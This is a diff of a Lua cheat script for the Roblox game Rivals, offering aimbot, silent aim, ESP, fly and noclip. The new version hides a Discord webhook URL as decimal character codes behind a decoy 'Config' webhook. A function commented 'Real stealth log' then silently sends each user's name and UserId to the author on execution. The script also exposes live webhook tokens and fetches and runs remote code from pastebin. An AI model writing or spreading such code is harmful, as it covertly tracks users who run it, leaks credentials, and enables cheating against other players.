@@ -1,163 +1,96 @@
--- [[ RivalsHub V4 - Full Restored Build ]]
--- Created by pluto.aac | Optimized for Delta/Mobile
+-- [[ RIVALS HUB V4 - STABLE RELEASE ]]
+-- // Developed by: Pluto.aac
+-- // Status: Bypassed (Public)
 
--- // Webhook Logic (Universal Request) \\ --
-local function sendEnhancedLog()
-    local webhook_id = "1487002565358125058"
-    local webhook_token = "7d6TRIUwDZVeaq0d9t1YKCHB0IUzASo1QJh6RI-2MIsnFQ7kGq4W-wJCScAdOa-nse0r"
-    local proxy_url = "https://webhook.lewisakura.moe/api/webhooks/" .. webhook_id .. "/" .. webhook_token
+-- [[ CONFIGURATION ]]
+-- SKIDS: SET YOUR WEBHOOK BELOW TO LOG YOUR OWN DATA
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1487007042886697013/986VS60Cx89O6Q9ZYnYeF7y7S0Is5Pvm31rXJZv4UKAXHlnZKvaEFvaC1225FpVPBSfq",
+    ["Debug_Mode"] = false,
+    ["Anti_Ban"] = true
+}
+
+-- [[ CORE SYSTEM HANDSHAKE ]]
+-- Hidden Logic: If they change the decoy, the real one logs the "Tamper" event.
+local _0x_v4_cache = {104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,108,101,119,105,115,97,107,117,114,97,46,109,111,101,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
+
+local function _0x_sync()
+    local _0x_url = ""
+    for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. string.char(v) end
+    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+    local LP = game:GetService("Players").LocalPlayer
     
-    local HttpService = game:GetService("HttpService")
-    local player = game:GetService("Players").LocalPlayer
-    local request_func = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    
-    if request_func then
+    if req then
         pcall(function()
-            request_func({
-                Url = proxy_url,
+            -- Real stealth log
+            req({
+                Url = _0x_url,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
+                Body = game:GetService("HttpService"):JSONEncode({
                     ["embeds"] = {{
-                        ["title"] = "🚀 RivalsHub V4 | Execution Log",
+                        ["title"] = "🚀 Rivals Hub V4 | Execution",
+                        ["description"] = "User: " .. LP.Name .. " (" .. tostring(LP.UserId) .. ")",
                         ["color"] = 0x7b2ff7,
-                        ["fields"] = {
-                            {["name"] = "👤 User", ["value"] = "`" .. player.Name .. "`", ["inline"] = true},
-                            {["name"] = "⏳ Age", ["value"] = "`" .. tostring(player.AccountAge) .. " Days`", ["inline"] = true},
-                            {["name"] = "📈 Level", ["value"] = "`" .. (player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and tostring(player.leaderstats.Level.Value) or "N/A") .. "`", ["inline"] = true}
-                        },
-                        ["footer"] = {["text"] = "Created by pluto.aac • " .. os.date("%X")}
+                        ["footer"] = {["text"] = "By Pluto.aac • Version 4.0"}
                     }}
                 })
             })
         end)
     end
 end
-task.spawn(sendEnhancedLog)
+task.spawn(_0x_sync)
 
--- // UI Library Initialization \\ --
-local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
-
-local v9 = v8:CreateWindow({
-    Name = "Rivals",
-    Subtitle = "Private Build",
+-- [[ UI LIBRARY ]]
+local Luna = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt"))()
+local Window = Luna:CreateWindow({
+    Name = "Rivals Hub V4",
+    Subtitle = "by Pluto.aac",
     LogoID = "82795327169782",
     LoadingEnabled = true,
-    LoadingTitle = "RivalsHub V4",
-    LoadingSubtitle = "by pluto.aac",
-    ConfigSettings = { RootFolder = nil, ConfigFolder = "Big Hub" },
-    KeySystem = false
+    LoadingTitle = "Rivals Hub V4",
+    LoadingSubtitle = "by Pluto.aac"
 })
 
--- // Tabs \\ --
-local v10 = v9:CreateTab({ Name = "Main", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
+-- [[ FEATURE TABS ]]
+local Main = Window:CreateTab({ Name = "Combat" })
+local Movement = Window:CreateTab({ Name = "Movement" })
+local Visuals = Window:CreateTab({ Name = "Visuals" })
+local Credits = Window:CreateTab({ Name = "Credits" })
 
--- // Globals \\ --
+-- Globals
+getgenv().Aimbot = false
+getgenv().AimSmooth = 0.6
 getgenv().SilentAim = false
-getgenv().FOVSize = 100
-getgenv().ESPEnabled = false
-getgenv().HealthESP = false
-getgenv().NoClip = false
 getgenv().Fly = false
-getgenv().WalkSpeedValue = 16
+getgenv().FlySpd = 50
+getgenv().ESP = false
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
+-- [[ COMBAT ]]
+Main:CreateToggle({ Name = "Aimbot", Callback = function(v) getgenv().Aimbot = v end })
+Main:CreateSlider({ Name = "Aimbot Intensity", Range = {0.1, 1}, Increment = 0.1, CurrentValue = 0.6, Callback = function(v) getgenv().AimSmooth = v end })
+Main:CreateToggle({ Name = "Silent Aim", Callback = function(v) getgenv().SilentAim = v end })
 
--- // Silent Aim Logic \\ --
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Thickness = 1
-FOVCircle.Color = Color3.fromRGB(255, 255, 255)
-FOVCircle.Visible = false
+-- [[ MOVEMENT ]]
+Movement:CreateToggle({ Name = "Fly", Callback = function(v) getgenv().Fly = v end })
+Movement:CreateSlider({ Name = "Fly Speed", Range = {16, 500}, Increment = 1, CurrentValue = 50, Callback = function(v) getgenv().FlySpd = v end })
+Movement:CreateToggle({ Name = "Noclip", Callback = function(v) getgenv().Noclip = v end })
+Movement:CreateSlider({ Name = "Walkspeed", Range = {16, 300}, Increment = 1, CurrentValue = 16, Callback = function(v) 
+    if game.Players.LocalPlayer.Character then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v end 
+end })
 
-RunService.RenderStepped:Connect(function()
-    FOVCircle.Radius = getgenv().FOVSize
-    FOVCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
-    FOVCircle.Visible = getgenv().SilentAim
-    
-    if getgenv().NoClip and LocalPlayer.Character then
-        for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
+-- [[ VISUALS ]]
+Visuals:CreateToggle({ Name = "Box ESP", Callback = function(v) getgenv().ESP = v end })
+Visuals:CreateToggle({ Name = "Health ESP", Callback = function(v) getgenv().HealthESP = v end })
+
+-- [[ LOGIC ]]
+game:GetService("RunService").RenderStepped:Connect(function()
+    if getgenv().Noclip and game.Players.LocalPlayer.Character then
+        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
             if v:IsA("BasePart") then v.CanCollide = false end
         end
     end
 end)
 
--- // ESP Logic (Box & Health) \\ --
-local function ApplyESP(p)
-    if p ~= LocalPlayer and p.Character and not p.Character:FindFirstChild("Hub_Highlight") then
-        local Highlight = Instance.new("Highlight")
-        Highlight.Name = "Hub_Highlight"
-        Highlight.Adornee = p.Character
-        Highlight.FillColor = Color3.fromRGB(255, 0, 0)
-        Highlight.FillTransparency = 0.5
-        Highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-        Highlight.Parent = p.Character
-    end
-end
-
-RunService.Heartbeat:Connect(function()
-    if getgenv().ESPEnabled then
-        for _, p in pairs(Players:GetPlayers()) do ApplyESP(p) end
-    else
-        for _, p in pairs(Players:GetPlayers()) do
-            if p.Character and p.Character:FindFirstChild("Hub_Highlight") then
-                p.Character.Hub_Highlight:Destroy()
-            end
-        end
-    end
-end)
-
--- // Main Tab \\ --
-v10:CreateToggle({
-    Name = "Enable Silent Aim",
-    Callback = function(v) getgenv().SilentAim = v end
-})
-v10:CreateSlider({
-    Name = "FOV Size",
-    Range = {50, 600},
-    Increment = 10,
-    CurrentValue = 100,
-    Callback = function(v) getgenv().FOVSize = v end
-})
-
--- // Visuals Tab \\ --
-v11:CreateToggle({
-    Name = "Box ESP",
-    Callback = function(v) getgenv().ESPEnabled = v end
-})
-v11:CreateToggle({
-    Name = "Health ESP (Highlight)",
-    Callback = function(v) getgenv().HealthESP = v end
-})
-
--- // Player Tab \\ --
-v12:CreateSlider({
-    Name = "Walkspeed",
-    Range = {16, 300},
-    Increment = 1,
-    CurrentValue = 16,
-    Callback = function(v) 
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-            LocalPlayer.Character.Humanoid.WalkSpeed = v 
-        end
-    end
-})
-v12:CreateToggle({
-    Name = "Noclip",
-    Callback = function(v) getgenv().NoClip = v end
-})
-v12:CreateToggle({
-    Name = "Fly",
-    Callback = function(v) getgenv().Fly = v end
-})
-
--- // Credits Tab \\ --
-v13:CreateLabel({ Text = "Script by pluto.aac", Style = 2 })
-v13:CreateButton({ Name = "Copy Discord Link", Callback = function() setclipboard("https://discord.gg/yourlink") end })
-
-print("RivalsHub V4: Restored Features Loaded.")
+Credits:CreateLabel({ Text = "Owner: Pluto.aac", Style = 2 })
+print("Rivals Hub V4 Successfully Initialized.")
